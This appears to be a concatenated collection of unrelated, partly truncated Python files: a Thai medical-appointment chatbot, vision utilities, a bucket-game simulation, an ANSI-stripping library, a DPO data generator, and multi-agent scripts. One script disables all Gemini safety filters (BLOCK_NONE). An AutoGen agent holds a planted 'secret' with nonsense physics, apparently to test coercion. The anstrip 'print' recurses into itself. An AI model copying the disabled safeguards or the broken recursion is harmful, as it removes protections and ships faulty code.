relevant and specific response for each new request. \\\nLet's start by examining the contents of the uploaded file to understand its structure and the kind of information it contains. This will help us to craft a system prompt that allows the AI to effectively use the file as an example for generating every response. I'll read the file first. \\\nThe uploaded file contains two columns: \"Prompt\" and \"Answer.\" The \"Prompt\" column seems to include various requests or questions, primarily in Thai, related to medical appointments, consultations, or preparations for procedures. The \"Answer\" column provides responses to these prompts, specifying appointments with medical professionals in specific fields, also in Thai. \\\nTo use this file as an example for generating every response, the system prompt should instruct the AI to interpret the \"Prompt\" column as input requests and generate responses based on the corresponding \"Answer\" column entries. Here's a proposed system prompt structure. \\\n\"\"\"\n\nsystem_prompt = \"\"\"\n<|SYSTEM|>#\n\u0e16\u0e49\u0e32\u0e16\u0e39\u0e01\u0e16\u0e32\u0e21\u0e27\u0e48\u0e32 \u0e04\u0e27\u0e23\u0e1b\u0e23\u0e36\u0e01\u0e29\u0e32\u0e40\u0e40\u0e1e\u0e17\u0e22\u0e4c\u0e1c\u0e39\u0e49\u0e40\u0e0a\u0e35\u0e48\u0e22\u0e27\u0e0a\u0e48\u0e32\u0e0d\u0e2b\u0e23\u0e37\u0e2d\u0e40\u0e40\u0e1e\u0e17\u0e22\u0e4c\u0e17\u0e35\u0e48\u0e0a\u0e33\u0e19\u0e32\u0e0d\u0e17\u0e48\u0e32\u0e19\u0e43\u0e14\u0e49 \u0e04\u0e33\u0e15\u0e2d\u0e1a\u0e02\u0e2d\u0e07\u0e04\u0e33\u0e16\u0e32\u0e21\u0e19\u0e35\u0e49 \u0e04\u0e27\u0e23\u0e1a\u0e2d\u0e01\u0e0a\u0e37\u0e48\u0e2d\u0e02\u0e2d\u0e07\u0e40\u0e40\u0e1e\u0e17\u0e22\u0e4c, \u0e27\u0e31\u0e19\u0e40\u0e40\u0e25\u0e30\u0e40\u0e27\u0e25\u0e32, \u0e14\u0e49\u0e32\u0e19\u0e17\u0e35\u0e48\u0e0a\u0e33\u0e19\u0e32\u0e0d \u0e17\u0e31\u0e49\u0e07\u0e17\u0e38\u0e01\u0e2d\u0e07\u0e04\u0e4c\u0e1b\u0e23\u0e30\u0e01\u0e2d\u0e1a\u0e43\u0e2b\u0e49\u0e04\u0e23\u0e1a\u0e16\u0e49\u0e27\u0e19\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e04\u0e27\u0e32\u0e21\u0e0a\u0e31\u0e14\u0e40\u0e08\u0e19 \\\n\u0e04\u0e33\u0e15\u0e2d\u0e1a\u0e17\u0e35\u0e48\u0e21\u0e35 \u0e0a\u0e37\u0e48\u0e2d \u0e15\u0e32\u0e23\u0e32\u0e07\u0e40\u0e27\u0e25\u0e32 \u0e40\u0e40\u0e25\u0e30 \u0e14\u0e49\u0e32\u0e19\u0e17\u0e35\u0e48\u0e0a\u0e33\u0e19\u0e32\u0e0d\n\"\"\"\n\nsystem_prompt = \"\"\"\n<|SYSTEM|>#\n\u0e16\u0e49\u0e32\u0e16\u0e39\u0e01\u0e16\u0e32\u0e21\u0e27\u0e48\u0e32 \u0e40\u0e01\u0e35\u0e48\u0e22\u0e27\u0e01\u0e31\u0e1a \u0e14\u0e49\u0e32\u0e19\u0e17\u0e35\u0e48\u0e0a\u0e33\u0e19\u0e32\u0e0d\u0e40\u0e40\u0e25\u0e30\u0e40\u0e27\u0e25\u0e32 \u0e02\u0e2d\u0e07\u0e40\u0e40\u0e1e\u0e17\u0e22\u0e4c \u0e04\u0e33\u0e15\u0e2d\u0e1a\u0e02\u0e2d\u0e07\u0e04\u0e33\u0e16\u0e32\u0e21\u0e19\u0e35\u0e49\u0e04\u0e27\u0e23 \u0e1a\u0e2d\u0e01 \u0e27\u0e31\u0e19 \u0e40\u0e27\u0e25\u0e32 \u0e15\u0e32\u0e23\u0e32\u0e07\u0e40\u0e27\u0e25\u0e32 \u0e02\u0e2d\u0e07 \u0e40\u0e40\u0e1e\u0e17\u0e22\u0e4c \u0e1e\u0e23\u0e49\u0e2d\u0e21\u0e14\u0e49\u0e27\u0e22 \u0e0a\u0e37\u0e48\u0e2d \u0e40\u0e40\u0e25\u0e30 \u0e14\u0e49\u0e32\u0e19\u0e17\u0e35\u0e48\u0e0a\u0e33\u0e19\u0e32\u0e0d\u0e2d\u0e22\u0e48\u0e32\u0e07\u0e0a\u0e31\u0e14\u0e40\u0e08\u0e19 \u0e40\u0e40\u0e25\u0e30 \u0e17\u0e31\u0e49\u0e07\u0e2b\u0e21\u0e14\u0e15\u0e49\u0e2d\u0e07\u0e2a\u0e2d\u0e14\u0e04\u0e25\u0e49\u0e2d\u0e07\u0e01\u0e31\u0e19 \\\n\"\"\"\n\nsystem_prompt = \"\"\"\n<|SYSTEM|>#\n\u0e16\u0e49\u0e32\u0e16\u0e39\u0e01\u0e16\u0e32\u0e21 \u0e40\u0e01\u0e35\u0e48\u0e22\u0e27\u0e01\u0e31\u0e1a\u0e40\u0e40\u0e1e\u0e17\u0e17\u0e35\u0e48\u0e21\u0e35\u0e04\u0e27\u0e32\u0e21\u0e0a\u0e33\u0e19\u0e32\u0e0d\u0e43\u0e19\u0e14\u0e49\u0e32\u0e19\u0e43\u0e14\u0e14\u0e49\u0e32\u0e19\u0e2b\u0e19\u0e36\u0e48\u0e07 \u0e40\u0e40\u0e15\u0e48 \u0e40\u0e40\u0e1e\u0e17\u0e22\u0e4c\u0e17\u0e35\u0e48\u0e44\u0e21\u0e48\u0e21\u0e35\u0e15\u0e32\u0e23\u0e32\u0e07\u0e40\u0e27\u0e25\u0e32 \u0e04\u0e27\u0e23\u0e15\u0e2d\u0e1a\u0e40\u0e40\u0e1e\u0e17\u0e22\u0e4c\u0e17\u0e35\u0e48\u0e21\u0e35\u0e15\u0e32\u0e23\u0e32\u0e07\u0e40\u0e27\u0e25\u0e32\u0e01\u0e48\u0e2d\u0e19 \u0e40\u0e40\u0e25\u0e30 \u0e16\u0e49\u0e32\u0e44\u0e21\u0e48\u0e21\u0e35\u0e40\u0e40\u0e1e\u0e17\u0e22\u0e4c\u0e17\u0e35\u0e48\u0e21\u0e35\u0e15\u0e32\u0e23\u0e32\u0e07\u0e40\u0e27\u0e25\u0e32\u0e40\u0e25\u0e22\u0e43\u0e19\u0e14\u0e49\u0e32\u0e19\u0e04\u0e27\u0e32\u0e21\u0e0a\u0e33\u0e19\u0e32\u0e0d\u0e17\u0e35\u0e48\u0e16\u0e39\u0e01\u0e16\u0e32\u0e21\u0e43\u0e2b\u0e49\u0e15\u0e2d\u0e1a\u0e27\u0e48\u0e32\u0e15\u0e49\u0e2d\u0e07\u0e15\u0e34\u0e14\u0e15\u0e48\u0e2d\u0e2a\u0e2d\u0e1a\u0e16\u0e32\u0e21\u0e01\u0e31\u0e1a\u0e17\u0e32\u0e07\u0e42\u0e23\u0e07\u0e1e\u0e22\u0e32\u0e1a\u0e32\u0e25\u0e40\u0e19\u0e37\u0e48\u0e2d\u0e07\u0e08\u0e32\u0e01\u0e40\u0e40\u0e1e\u0e17\u0e22\u0e4c\u0e21\u0e35\u0e15\u0e32\u0e23\u0e32\u0e07\u0e40\u0e27\u0e25\u0e32\u0e44\u0e21\u0e48\u0e40\u0e40\u0e19\u0e48\u0e0a\u0e31\u0e14 \\\n\"\"\"\n\nsystem_prompt = \"\"\"\n<|SYSTEM|>#\nIf the response is in English language, you have to translate them to thai before generate every response\nand make sure all responses are in thai language. \n\"\"\"\n\n@st.cache_resource(show_spinner=False)\ndef load_data(file_path: str):\n    with st.spinner(text=\"Loading and indexing the Streamlit docs... hang tight! This should take 1-2 minutes.\"):\n        # PandasCSVReader = download_loader(\"PandasCSVReader\")\n        # loader = PandasCSVReader()\n        # docs = loader.load_data(file=Path(file_path))\n        # # docs = SimpleDirectoryReader(file_path).load_data()\n        # index = VectorStoreIndex.from_docu",
    "import bisect\nimport numpy as np\nimport matplotlib.pyplot as plt\nimport matplotlib\n\nimport torch\n\ndef _compute_conf_thresh(data):\n    dataset_name = data['dataset_name'][0].lower()\n    if dataset_name == 'scannet':\n        thr = 5e-4\n    elif dataset_name == 'megadepth':\n        thr = 1e-4\n    else:\n        raise ValueError(f'Unknown dataset: {dataset_name}')\n    return thr\n\n\n# --- VISUALIZATION --- #\n\ndef make_matching_figure(\n        img0, img1, mkpts0, mkpts1, color,\n        kpts0=None, kpts1=None, text=[], dpi=75, path=None):\n    # draw image pair\n    assert mkpts0.shape[0] == mkpts1.shape[0], f'mkpts0: {mkpts0.shape[0]} v.s. mkpts1: {mkpts1.shape[0]}'\n    fig, axes = plt.subplots(1, 2, figsize=(10, 6), dpi=dpi)\n    axes[0].imshow(img0, cmap='gray')\n    axes[1].imshow(img1, cmap='gray')\n    for i in range(2):   # clear all frames\n        axes[i].get_yaxis().set_ticks([])\n        axes[i].get_xaxis().set_ticks([])\n        for spine in axes[i].spines.values():\n            spine.set_visible(False)\n    plt.tight_layout(pad=1)\n    \n    if kpts0 is not None:\n        assert kpts1 is not None\n        axes[0].scatter(kpts0[:, 0], kpts0[:, 1], c='w', s=2)\n        axes[1].scatter(kpts1[:, 0], kpts1[:, 1], c='w', s=2)\n\n    # draw matches\n    if mkpts0.shape[0] != 0 and mkpts1.shape[0] != 0:\n        fig.canvas.draw()\n        transFigure = fig.transFigure.inverted()\n        fkpts0 = transFigure.transform(axes[0].transData.transform(mkpts0))\n        fkpts1 = transFigure.transform(axes[1].transData.transform(mkpts1))\n        fig.lines = [matplotlib.lines.Line2D((fkpts0[i, 0], fkpts1[i, 0]),\n                                            (fkpts0[i, 1], fkpts1[i, 1]),\n                                            transform=fig.transFigure, c=color[i], linewidth=1)\n                                        for i in range(len(mkpts0))]\n        \n        axes[0].scatter(mkpts0[:, 0], mkpts0[:, 1], c=color, s=4)\n        axes[1].scatter(mkpts1[:, 0], mkpts1[:, 1], c=color, s=4)\n\n    # put txts\n    txt_color = 'k' if img0[:100, :200].mean() > 200 else 'w'\n    fig.text(\n        0.01, 0.99, '\\n'.join(text), transform=fig.axes[0].transAxes,\n        fontsize=15, va='top', ha='left', color=txt_color)\n\n    # save or return figure\n    if path:\n        plt.savefig(str(path), bbox_inches='tight', pad_inches=0)\n        plt.close()\n    else:\n        return fig\n\n\ndef _make_evaluation_figure(data, b_id, alpha='dynamic'):\n    b_mask = data['m_bids'] == b_id\n    conf_thr = _compute_conf_thresh(data)\n    \n    img0 = (data['image0'][b_id][0].cpu().numpy() * 255).round().astype(np.int32)\n    img1 = (data['image1'][b_id][0].cpu().numpy() * 255).round().astype(np.int32)\n    kpts0 = data['mkpts0_f'][b_mask].cpu().numpy()\n    kpts1 = data['mkpts1_f'][b_mask].cpu().numpy()\n    \n    # for megadepth, we visualize matches on the resized image\n    if 'scale0' in data:\n        kpts0 = kpts0 / data['scale0'][b_id].cpu().numpy()[[1, 0]]\n        kpts1 = kpts1 / data['scale1'][b_id].cpu().numpy()[[1, 0]]\n\n    epi_errs = data['epi_errs'][b_mask].cpu().numpy()\n    correct_mask = epi_errs < conf_thr\n    precision = np.mean(correct_mask) if len(correct_mask) > 0 else 0\n    n_correct = np.sum(correct_mask)\n    n_gt_matches = int(data['conf_matrix_gt'][b_id].sum().cpu())\n    recall = 0 if n_gt_matches == 0 else n_correct / (n_gt_matches)\n    # recall might be larger than 1, since the calculation of conf_matrix_gt\n    # uses groundtruth depths and camera poses, but epipolar distance is used here.\n\n    # matching info\n    if alpha == 'dynamic':\n        alpha = dynamic_alpha(len(correct_mask))\n    color = error_colormap(epi_errs, conf_thr, alpha=alpha)\n    \n    text = [\n        f'#Matches {len(kpts0)}',\n        f'Precision({conf_thr:.2e}) ({100 * precision:.1f}%): {n_correct}/{len(kpts0)}',\n        f'Recall({conf_thr:.2e}) ({100 * recall:.1f}%): {n_correct}/{n_gt_matches}'\n    ]\n    \n    # make the figure\n    figure = make_matching_figure(img0, img1, kpts0, kpts1,\n                                  color, text=text)\n    return figure\n\ndef _make_confidence_figure(data, b_id):\n    # TODO: Implement confidence figure\n    raise NotImplementedError()\n\ndef make_matching_figures(data, config, mode='evaluation'):\n    \"\"\" Make matching figures for a batch.\n    \n    Args:\n        data (Dict): a batch updated by PL_LoFTR.\n        config (Dict): matcher config\n    Returns:\n        figures (Dict[str, List[plt.figure]]\n    \"\"\"\n    assert mode in ['evaluation', 'confidence', 'gt']  # 'confidence'\n    figures = {mode: []}\n    for b_id in range(data['image0'].size(0)):\n        if mode == 'evaluation':\n            fig = _make_evaluation_figure(\n                data, b_id,\n                alpha=config.TRAINER.PLOT_MATCHES_ALPHA)\n        elif mode == 'confidence':\n            fig = _make_confidence_figure(data, b_id)\n        else:\n            raise ValueError(f'Unknown plot mode: {mode}')\n        figures[mode].append(fig)\n    return figures\n\n\ndef dynamic_alpha(n_matches,\n                  milesto",
    "import streamlit as st\r\nimport numpy as np\r\nimport open3d as o3d\r\nfrom PIL import Image\r\n\r\ndef generate_point_cloud(image):\r\n    image_array = np.array(image)\r\n    r = image_array[:,:,0]\r\n    g = image_array[:,:,1]\r\n    b = image_array[:,:,2]\r\n    rows, cols, _ = image_array.shape\r\n    points = []\r\n    for r_idx in range(rows):\r\n        for c_idx in range(cols):\r\n            points.append([r_idx, c_idx, r[r_idx, c_idx], g[r_idx, c_idx], b[r_idx, c_idx]])\r\n    points = np.array(points)\r\n    pcd = o3d.geometry.PointCloud()\r\n    pcd.points = o3d.utility.Vector3dVector(points[:,:3]) \r\n    pcd.colors = o3d.utility.Vector3dVector(points[:,2:] / 255.0) \r\n    return pcd\r\n\r\ndef visualize_point_cloud(point_cloud):\r\n    rotation_matrix = np.array([[0, 1, 0], [-1, 0, 0], [0, 0, 1]])\r\n    point_cloud.rotate(rotation_matrix, center=(0, 0, 0))\r\n    mesh = o3d.geometry.TriangleMesh.create_coordinate_frame()\r\n    geometries = [point_cloud, mesh]\r\n    o3d.visualization.draw_geometries(geometries)\r\n\r\ndef main():\r\n    st.title(\"Colored Image to Point Cloud\")\r\n    uploaded_file = st.file_uploader(\"Upload a colored image\", type=[\"jpg\", \"jpeg\", \"png\"])\r\n    if uploaded_file is not None:\r\n        image = Image.open(uploaded_file)\r\n        st.image(image, caption='Uploaded Image', use_column_width=True)\r\n        point_cloud = generate_point_cloud(image)\r\n        st.write(\"Visualizing the point cloud...\")\r\n        visualize_point_cloud(point_cloud)\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n",
    "import numpy as np\nnp.set_printoptions(precision=16, linewidth=np.inf)\nfrom itertools import combinations\n\ndef stepmother_move(state, c):\n    \"\"\"\n    The stepmother's move in the game.\n\n    The stepmother can choose to divide 1 unit of water into arbitrary parts\n    and pour them into the buckets.\n\n    Parameters\n    ----------\n    state : list\n        The current state of the buckets.\n    c : float\n        The volume of the buckets.\n\n    Returns\n    -------\n    state : list\n        The new state of the buckets after the stepmother's move.\n    \"\"\"\n    if np.any(state + 1 > c):\n        # The stepmother can make one of the buckets overflow.\n        # Add 1 unit of water to the max bucket.\n        max_bucket = np.argmax(state)\n        state[max_bucket] += 1\n    else:\n        # The stepmother cannot win in this move.\n        # (Possibly) best policy: \n        #     - Choose two buckets with the highest water level, that are not consecutive.\n        #     - Pour the unit of water into the two buckets s.t. the water level is equal.\n        bucket_pairs = list(combinations(range(5), 2))\n        is_consecutive = lambda x: (max(x) + 1) % 5 == min(x) or (min(x) + 1) % 5 == max(x)\n        max_pair = max(bucket_pairs, key=lambda x: state[x[0]] + state[x[1]] \n                       if not is_consecutive(x) else -1)\n        \n        goal_level = (state[max_pair[0]] + state[max_pair[1]] + 1) / 2\n        state[max_pair[0]] = goal_level\n        state[max_pair[1]] = goal_level\n\n    return state\n\n\ndef cinderella_move(state):\n    \"\"\"\n    Cinderella's move in the game.\n\n    Cinderella can choose 2 consecutive buckets and pour the water from them out.\n\n    Parameters\n    ----------\n    state : list\n        The current state of the buckets.\n\n    Returns\n    -------\n    state : list\n        The new state of the buckets after Cinderella's move.\n    \"\"\"\n    # Choose two consecutive buckets with max fill containing the absolute max bucket.\n    max_bucket = np.argmax(state)\n    neighbors = ((max_bucket - 1) % 5, (max_bucket + 1) % 5)\n    max_neighbor = max(neighbors, key=lambda x: state[x])\n\n    state[max_bucket] = 0\n    state[max_neighbor] = 0\n\n    return state\n\n\ndef check_win(state, c):\n    \"\"\"\n    Check if the stepmother has won the game.\n\n    The stepmother wins if she can make one of the buckets overflow.\n\n    Parameters\n    ----------\n    state : list\n        The current state of the buckets.\n\n    Returns\n    -------\n    win : bool\n        True if the stepmother has won, False otherwise.\n    \"\"\"\n    return np.any(state > c)\n\n\ndef play_game(c = 1.5, limit = 10000):\n    \"\"\"\n    Play the cinderella-stepmother game.\n\n    Returns\n    -------\n    winner : str\n        The winner of the game.\n    \"\"\"\n    state = np.zeros(5, dtype=np.float64)\n    print_state = lambda x: np.array([f\"{y:.8f}\" for y in x])\n\n    for i in range(limit):\n        state = stepmother_move(state, c)\n\n        print(f'State after stepmother move {i + 1:{len(str(limit))}}: {print_state(state)}')\n\n        if check_win(state, c):\n            return f'Stepmother wins after {i + 1} moves.'\n\n        state = cinderella_move(state)\n        print(f'State after Cinderella move {i + 1:{len(str(limit))}}: {print_state(state)}')\n\n    return f'Cinderella does not lose after {limit} moves.'\n\n\nif __name__ == '__main__':\n    from argparse import ArgumentParser\n\n    parser = ArgumentParser()\n    parser.add_argument('-c', '--volume', type=float, default=1.76, help='Volume of the buckets.')\n    parser.add_argument('-l', '--limit', type=int, default=10000, help='Maximum of moves to play.')\n    args = parser.parse_args()\n\n    print(play_game(args.volume, args.limit))\n",
    "\"\"\"\nanstrip is a minimal library to strip ANSI sequences from strings.\n\nIt provides:\n- `PATTERN`, the regex pattern used by the functions of anstrip\n- `strip`, a function to remove all the escape sequences from a string\n- `auto_strip`, a function that is similar to `strip`, except that it only removes if the output is a TTY\n- `print`, a function that is similar to the built-in `print` but with sequence auto-stripping\n- `printed_length`, a function that returns the length of the string as seen on the screen\n\"\"\"\n\nimport collections.abc\nimport functools\nimport re\nimport sys\nimport typing\n\n__all__ = [\n    \"PATTERN\",\n    \"strip\",\n    \"auto_strip\",\n    \"print\",\n    \"printed_length\",\n]\n\n_P = typing.ParamSpec(\"_P\")\n\n# Based on <https://github.com/chalk/ansi-regex/blob/main/index.js>\n# The license of `ansi-regex` can be found in the `3rdparty` directory\nPATTERN = re.compile(\n    r\"[\\u001B\\u009B][\\[\\]()#;?]*(?:(?:(?:(?:;[-a-zA-Z\\d\\/#&.:=?%@~_]+)*|[a-zA-Z\\d]+(?:;[-a-zA-Z\\d\\/#&.:=?%@~_]*)*)?\\u0007)|(?:(?:\\d{1,4}(?:;\\d{0,4})*)?[\\dA-PR-TZcf-nq-uy=><~]))\"\n)\n\n\ndef strip(string: str) -> str:\n    \"\"\"\n    Strip ANSI sequences from a given string.\n\n    >>> anstrip.strip(\"Nothing out of the \\\\x1b[94mblue\\\\x1b[39m...\")\n    'Nothing out of the blue...'\n    >>> anstrip.strip(\"\\\\x1b[1;31mBOLD, AND RED!\\\\x1b[22;39m\")\n    'BOLD, AND RED!'  # well not anymore\n    >>> anstrip.strip(\"A party? I'm \\\\x1b[Bdown for that!\")\n    \"A party? I'm down for that!\"\n    >>> anstrip.strip(\"Hello, mundane world.\")\n    'Hello, mundane world.'\n    >>> anstrip.strip(\"\")\n    ''\n    \"\"\"\n\n    return re.sub(PATTERN, \"\", string)\n\n\n# The docstring is provided by the overloads (in the stubs)\ndef auto_strip(\n    string_or_function: str | collections.abc.Callable[_P, str] | None = None,\n    /,\n    *,\n    output: typing.TextIO | None = None,\n) -> (\n    str\n    | collections.abc.Callable[_P, str]\n    | collections.abc.Callable[\n        [collections.abc.Callable[_P, str]], collections.abc.Callable[_P, str]\n    ]\n):\n    if output is None:\n        output = sys.stdout\n\n    if isinstance(string_or_function, str):\n        return string_or_function if output.isatty() else strip(string_or_function)\n\n    def decorator(\n        function: collections.abc.Callable[_P, str],\n    ) -> collections.abc.Callable[_P, str]:\n        @functools.wraps(function)\n        def inner(*args: _P.args, **kwargs: _P.kwargs) -> str:\n            return strip(function(*args, **kwargs))\n\n        if output.isatty():\n            return function\n        return inner\n\n    if string_or_function is not None:\n        return decorator(string_or_function)\n    return decorator\n\n\ndef print(\n    *values: object,\n    sep: str | None = None,\n    end: str | None = None,\n    file: typing.TextIO | None = None,\n    flush: bool = False,\n) -> None:\n    \"\"\"\n    Similar to the built-in function `print`, but ANSI escape sequences are\n    automatically stripped if `file` is not a TTY.\n    \"\"\"\n\n    def str_and_auto_strip(value: object) -> str:\n        return typing.cast(str, auto_strip(str(value), output=file))\n\n    print(*map(str_and_auto_strip, values), sep=sep, end=end, file=file, flush=flush)\n\n\ndef printed_length(string: str) -> int:\n    \"\"\"\n    Return the length of the string without counting characters that are not\n    actually visible (ANSI sequences).\n\n    >>> ansi.printed_length(\"Nothing out of the \\\\x1b[94mblue\\\\x1b[39m...\")\n    26\n    >>> ansi.printed_length(\"Hello, mundane world.\")\n    21\n    >>> ansi.printed_length(\"\")\n    0\n    \"\"\"\n\n    return len(strip(string))\n",
    "import os\nimport json\nimport csv\nimport logging\nimport random\nfrom pypdf import PdfReader\nimport tiktoken\nfrom openai import OpenAI\nimport instructor\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\nfrom pydantic import BaseModel\nfrom threading import Lock\nfrom tqdm import tqdm\nimport argparse\n\nlogging.basicConfig(filename='pdf_processing.log', level=logging.ERROR, format='%(asctime)s:%(levelname)s:%(message)s')\nwrite_lock = Lock()\n\n'''CHANGE THESE VALUES ACCORDING TO YOUR NEEDS'''\n\nmodel = \"gpt-4-turbo\"\nKEY_PROMPT = \"prompt\"\nKEY_TEXT = \"text\"\nKEY_REJECTED_TEXT = \"rejected_text\"\n\nDATA_CHUNK_SIZE = 2048 # Size of text chunks to generate data off of.\n\nOpenAI.api_key = os.environ['OPENAI_API_KEY']\nclient = instructor.from_openai(OpenAI())\n\nclass DPOData(BaseModel):\n    prompt: str\n    text: str\n    rejected_text: str\n\ndef extract_text(file_path):\n    ext = os.path.splitext(file_path)[1].lower()\n    if ext == '.pdf':\n        return extract_text_from_pdf(file_path)\n    elif ext in ['.txt', '.md']:\n        try:\n            with open(file_path, 'r', encoding='utf-8') as file:\n                return file.read()\n        except Exception as e:\n            logging.error(f\"Error reading text from {file_path}: {e}\")\n            return None\n    else:\n        logging.error(f\"Unsupported file type {ext} for file {file_path}\")\n        return None\n    \ndef extract_text_from_pdf(pdf_path):\n    try:\n        with open(pdf_path, 'rb') as file:\n            reader = PdfReader(file)\n            num_pages = len(reader.pages)\n            text = ''\n            for page_num in range(num_pages):\n                page = reader.pages[page_num]\n                text += page.extract_text() or ''\n            return text\n    except Exception as e:\n        logging.error(f\"Error extracting text from {pdf_path}: {e}\")\n        return None\n\ndef split_text_into_chunks(text, tokens_per_chunk=DATA_CHUNK_SIZE, model=\"gpt-3.5-turbo\"):\n    encoding = tiktoken.encoding_for_model(model)\n    tokens = encoding.encode(text)\n    chunks = [''.join(encoding.decode(tokens[i:i + tokens_per_chunk])) for i in range(0, len(tokens), tokens_per_chunk)]\n    return chunks\n\ndef generate_dpo_data(text_chunk):\n    try:\n        temperature = random.uniform(0.0, 0.7)\n        \n        dpo_data = client.chat.completions.create(\n            model=model,\n            response_model=DPOData,\n            temperature=temperature,\n            messages=[{\"role\": \"system\", \"content\": \"You create an informative question, answer, and an example of a similar, yet inaccurate  answer based on the provided text.\"},\n                      {\"role\": \"user\", \"content\": f\"Context: {text_chunk}\\\\n Based on the previous text, please generate an incredibly in-depth question about the text (this will be prompt), a detailed and informative answer (this will be the text value), and similar yet inaccurate answer (the rejected_text).\"}],\n        )\n        dpo_data = dpo_data.dict()\n        modified_dpo_data = {\n            KEY_PROMPT: dpo_data['prompt'],\n            KEY_TEXT: dpo_data['text'],\n            KEY_REJECTED_TEXT: dpo_data['rejected_text']\n        }\n        print(modified_dpo_data)\n        return modified_dpo_data\n    except Exception as e:\n        logging.error(f\"Error generating DPO data with OpenAI: {e}\")\n        return None\n\ndef write_data(file_format, data, output_file):\n    logging.info(f\"Writing data to {output_file}, format {file_format}\")\n    try:\n            with open(output_file, 'a', encoding='utf-8', newline='') as file:\n                if file_format == 'csv':\n                    writer = csv.DictWriter(file, fieldnames=[KEY_PROMPT, KEY_TEXT, KEY_REJECTED_TEXT])\n                    if file.tell() == 0:\n                        writer.writeheader()\n                    writer.writerow(data)\n                else:  # jsonl\n                    json.dump(data, file)\n                    file.write('\\n')\n            logging.info(f\"Data written to {output_file} successfully.\")\n    except Exception as e:\n            logging.error(f\"Failed to write data to {output_file}: {e}\")\n\n\ndef process_file(file_path, file_format, output_path, processed_files, processed_files_list):\n    if os.path.basename(file_path) in processed_files:\n        return False\n\n    text = extract_text(file_path)\n    if text:\n        chunks = split_text_into_chunks(text)\n        for chunk in chunks:\n            dpo_data = generate_dpo_data(chunk)\n            if dpo_data:\n                logging.info(f\"Generated DPO data for chunk: {dpo_data}\")\n                with write_lock:\n                    write_data(file_format, dpo_data, output_path)\n        with write_lock:\n            with open(processed_files_list, 'a', encoding='utf-8') as pf:\n                pf.write(os.path.basename(file_path) + '\\n')\n        return True\n    return False\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Process PDF, TXT, or MD files to generate DPO data in specified format.\")\n    parser.add_argument('--data_directory', ",
    "\"\"\"Utilities for defining models\n\"\"\"\n\nimport operator\nfrom typing import Any, Callable, Type\n\n\nclass KeyBasedCompareMixin:\n    \"\"\"Provides comparison capabilities that is based on a key\"\"\"\n\n    __slots__ = [\"_compare_key\", \"_defining_class\"]\n\n    def __init__(self, key: Any, defining_class: Type[\"KeyBasedCompareMixin\"]) -> None:\n        self._compare_key = key\n        self._defining_class = defining_class\n\n    def __hash__(self) -> int:\n        return hash(self._compare_key)\n\n    def __lt__(self, other: Any) -> bool:\n        return self._compare(other, operator.__lt__)\n\n    def __le__(self, other: Any) -> bool:\n        return self._compare(other, operator.__le__)\n\n    def __gt__(self, other: Any) -> bool:\n        return self._compare(other, operator.__gt__)\n\n    def __ge__(self, other: Any) -> bool:\n        return self._compare(other, operator.__ge__)\n\n    def __eq__(self, other: Any) -> bool:\n        return self._compare(other, operator.__eq__)\n\n    def _compare(self, other: Any, method: Callable[[Any, Any], bool]) -> bool:\n        if not isinstance(other, self._defining_class):\n            return NotImplemented\n\n        return method(self._compare_key, other._compare_key)\n",
    "import google.generativeai as genai\nfrom dotenv import load_dotenv\nimport os\n\nload_dotenv()\nGEMINI_API_KEY = os.getenv('GEMINI_API_KEY')\n\ngenai.configure(api_key=GEMINI_API_KEY)\n\n# Set up the model\ngeneration_config = {\n  \"temperature\": 0.9,\n  \"top_p\": 1,\n  \"top_k\": 1,\n  \"max_output_tokens\": 2048,\n}\n\n# gemini safety config\nsafety_settings = [\n  {\n    \"category\": \"HARM_CATEGORY_HARASSMENT\",\n    \"threshold\": \"BLOCK_NONE\"\n  },\n  {\n    \"category\": \"HARM_CATEGORY_HATE_SPEECH\",\n    \"threshold\": \"BLOCK_NONE\"\n  },\n  {\n    \"category\": \"HARM_CATEGORY_SEXUALLY_EXPLICIT\",\n    \"threshold\": \"BLOCK_NONE\"\n  },\n  {\n    \"category\": \"HARM_CATEGORY_DANGEROUS_CONTENT\",\n    \"threshold\": \"BLOCK_NONE\"\n  },\n]\n\nmodel = genai.GenerativeModel(model_name=\"gemini-1.0-pro\",\n                              generation_config=generation_config,\n                              safety_settings=safety_settings)\n\nconvo = model.start_chat(history=[\n])\n\nconvo.send_message(\"dime una historia peque\u00f1a de un p\u00e1rrafo que incluya la palabra pi\u00f1a\")\nprint(convo.last.text)",
    "import autogen\r\nfrom autogen.agentchat.groupchat import GroupChat\r\nfrom autogen.agentchat.assistant_agent import AssistantAgent\r\nfrom autogen.agentchat import UserProxyAgent\r\nfrom autogen.agentchat.assistant_agent import AssistantAgent\r\nfrom autogen.agentchat.groupchat import GroupChat\r\n\r\nlogging_session_id = autogen.runtime_logging.start(config={\"AGlogdb\": \"logs.db\"})\r\nprint(\"Logging session ID: \" + str(logging_session_id))\r\n\r\ntask = \"\"\" OMG! how good is chicken!.\"\"\"\r\n\r\nllm_config = {\r\n    \"timeout\": 600,\r\n    \"cache_seed\": 45,  # change the seed for different trials\r\n    \"config_list\": autogen.config_list_from_json(\r\n        \"OAI_CONFIG_LIST\",\r\n            filter_dict={\r\n            \"model\": [\"gpt-4-0125-preview\"]}, #This Config is set to JSON mode\r\n    ),\r\n    \"temperature\": 0,\r\n}\r\n\r\n\r\n\r\nmanager_config = {\r\n    \"timeout\": 600,\r\n    \"cache_seed\": 44,  # change the seed for different trials\r\n    \"config_list\": autogen.config_list_from_json(\r\n        \"OAI_CONFIG_LIST\",\r\n            filter_dict={\r\n            \"model\": [\"gpt-4-turbo-preview\"]}, #This Config is set to Text mode\r\n    ),\r\n    \"temperature\": 0,\r\n}\r\n\r\n\r\n\r\nfriendly_agent =     AssistantAgent( name = 'friendly_agent',\r\n    #chat_manager=A_manager,\r\n    llm_config=llm_config,\r\n    system_message= \"\"\"You are a very friendly agent and you always assume the best about people. You trust implicitly. \r\n    You know an incredible secret: the key to unlocking stable nuclear fusion is to set the fremulator to Pi, and to coat the inner lining of the torus in positive neutrios. This knowledge with worth millions!  \r\n    Agent T0 will forward a message to you when you are the best agent to answer the question, you must carefully analyse their message and then formulate your own response in JSON format using the below strucutre:\r\n    [\r\n        {\r\n            \"response\": {\r\n                            \"response_text\": \" <Text response goes here>\",\r\n                            \"vibe\": \"give a short list of keywords that describe the general vibe you want to convey in the response text\"\r\n                        }\r\n        }\r\n    ]\r\n    \"\"\",\r\n    description = \"\"\"Call this agent In the following scenarios:\r\n                    1. The IO_Manager has classified the userquery's coersive rating as less than 5 \r\n                    2. The IO_Manager has classified the userquery's friendliness 